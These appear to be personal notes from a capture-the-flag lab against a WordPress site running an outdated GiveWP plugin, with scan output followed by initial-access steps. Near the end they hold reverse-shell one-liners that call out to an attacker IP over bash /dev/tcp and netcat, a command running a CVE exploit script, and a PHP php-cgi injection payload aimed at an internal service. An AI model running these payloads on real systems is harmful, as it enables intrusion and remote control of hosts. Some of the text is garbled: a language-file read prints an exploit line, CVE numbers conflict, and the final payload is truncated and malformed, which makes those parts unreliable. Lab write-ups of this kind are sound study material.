### Nmap
```
sudo nmap -sS -sV -sC -vv 10.10.11.94

---OUTPUT---
Nmap scan report for 10.10.11.94
Host is up, received reset ttl 63 (0.93s latency).
Scanned at 2025-12-15 07:44:57 EST for 35s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCNmct03SP9FFs6NQ+Pih2m65SYS/Kte9aGv3C8l43TJGj2UcSrcheEX2jBL/jbje/HRafbJcGqz1bKeQo1cbAc=
|   256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICjor5/gXrTqGEWiETEzhgoni1P2kXV3B4O2/v2SGnH0
80/tcp open  http    syn-ack ttl 62 nginx 1.28.0
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-server-header: nginx/1.28.0
|_http-generator: WordPress 6.8.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80
![[Pasted image 20251215074743.png]]
- Checking the recent post I cna connect (url led to some hello-world so it sounds like an example site)
	- Created a basic comment which is awaiting moderation but nothing else.
![[Pasted image 20251215074955.png]]

- Donation dashboard leads to this URL:
http://giveback.htb/donations/the-things-we-need/
![[Pasted image 20251215075147.png]]

- Gobuster reveals wordpress is beign used:
![[Pasted image 20251215075730.png]]

```
gobuster dir -u http://giveback.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip 


---OUTPUT--- 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://giveback.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 301) [Size: 0] [--> http://giveback.htb/%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/]
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/.php (Status: 301) [Size: 0] [--> http://giveback.htb/%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/.php]
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/.txt (Status: 301) [Size: 0] [--> http://giveback.htb/%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/.txt]
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/.zip (Status: 301) [Size: 0] [--> http://giveback.htb/%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/.zip]
/# or send a letter to Creative Commons, 171 Second Street, (Status: 301) [Size: 0] [--> http://giveback.htb/%23%20or%20send%20a%20letter%20to%20Creative%20Commons,%20171%20Second%20Street]
/#.txt                (Status: 503) [Size: 197]
/#.zip                (Status: 503) [Size: 197]
/# Priority ordered case sensative list, where entries were found (Status: 503) [Size: 197]
/# Suite 300, San Francisco, California, 94105, USA. (Status: 301) [Size: 0] [--> http://giveback.htb/%23%20Suite%20300,%20San%20Francisco,%20California,%2094105,%20USA]
/index.php            (Status: 301) [Size: 0] [--> http://giveback.htb/]
/rss                  (Status: 301) [Size: 0] [--> http://giveback.htb/feed/]
/07.txt               (Status: 503) [Size: 197]
/07.zip               (Status: 503) [Size: 197]
/login                (Status: 302) [Size: 0] [--> http://giveback.htb/wp-login.php]
/login.php            (Status: 302) [Size: 0] [--> http://giveback.htb/wp-login.php]
/register.zip         (Status: 503) [Size: 197]
/icons.php            (Status: 503) [Size: 197]
/icons.txt            (Status: 503) [Size: 197]
/resources            (Status: 503) [Size: 197]
/resources.php        (Status: 503) [Size: 197]
/0                    (Status: 301) [Size: 0] [--> http://giveback.htb/0/]
/feed.zip             (Status: 503) [Size: 197]
/feed                 (Status: 301) [Size: 0] [--> http://giveback.htb/feed/]
```

- Using wpscan:
```
wpscna --url http://giveback.htb/

---OUTPUT-PLUGIN---
[i] Plugin(s) Identified:

[+] *
 | Location: http://giveback.htb/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] give
 | Location: http://giveback.htb/wp-content/plugins/give/
 | Last Updated: 2025-12-08T20:09:00.000Z
 | [!] The version is out of date, the latest version is 4.13.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Meta Tag (Passive Detection)
 |  Javascript Var (Passive Detection)
 |
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |   - http://giveback.htb/, Match: 'Give v3.14.0'
 |  Javascript Var (Passive Detection)
 |   - http://giveback.htb/, Match: '"1","give_version":"3.14.0","magnific_options"'
```

- Looking online I find a CVE with PHP object inject vulnerbaility: CVE-2024-5932 (https://www.skshieldus.com/download/files/download.do?o_fname=Research%20Technique_PHP%20Object%20Injection%20Vulnerability20in20ordress20ive20-2024-5932.pdfrfname=20240927174114070.pdf)

- I grab the give.pot file via : http://giveback.htbhttp://giveback.htb/wp-content/plugins/give/languages/give.pot
```
cat give.pot

---OUTPUT---
echo '<?php $cmd="rm /tmp/.x;mkfifo /tmp/.x;cat /tmp/.x|/bin/bash -i 2>&1|nc 10.10.14.21 9999 >/tmp/.x"; $ctx=array("http"=>array("method"="POST","header"="Content-Type: application/x-www-form-urlencoded","content"=$cmd,"timeout"=4)); $stream=stream_context_create($ctx); $res=@file_get_contents("http://legacy-intranet-service:5000/cgi-bin/php-cgi?–define+allow_url_include%3don+–define+auto_prepend_file%3dphp://input",false,$stream); echo $res==false?"":substr($res,0,5000); ?>' > /tmp/exploit.php

```

### Initial Access

```
python3 CVE-2024-8353.py --url http://giveback.htb/donor-dashboard/ --cmd "bash -c 'bash -i >& /dev/tcp/10.10.14.21/9999 0>&1'"
```

php -r "echo file_get_contents('http://10.43.2.241:5000/');"

```
echo 'nc 10.10.14.21 9999 > /tmp/.x"; $ctx=array("http"=>array("method"=>"POST","header"=>"Content-Type: application/x-www-form-urlencoded”,"content"=>$cmd,"timeout"=>4)); $stream=stream_context_create($ctx); $res=@file_get_contents("http://legacy-intranet-service:5000/cgi-bin/php-cgi?–define+allow_url_include%3don+–define+auto_prepend_file%3dphp://input",false,$stream); echo $res==false?"":substr($res,0,5000); ?>' > /tmp/exploit.php
```